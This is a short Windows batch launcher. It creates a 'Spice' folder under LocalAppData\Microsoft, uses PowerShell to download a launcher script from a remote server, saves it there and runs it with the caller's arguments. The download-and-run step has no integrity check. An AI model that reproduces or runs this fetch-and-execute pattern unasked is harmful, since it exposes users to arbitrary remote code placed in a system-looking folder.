@echo off
if not exist "%LOCALAPPDATA%\Microsoft\Spice" mkdir "%LOCALAPPDATA%\Microsoft\Spice"
powershell "Set-Content -Path $env:LOCALAPPDATA\Microsoft\Spice\launcher.ps1 -Value (iwr -UseBasicParsing -Uri https://mac.svnx.dev/builds/scripts/launcher.ps1).Content"
powershell -File "%LOCALAPPDATA%\Microsoft\Spice\launcher.ps1" %*
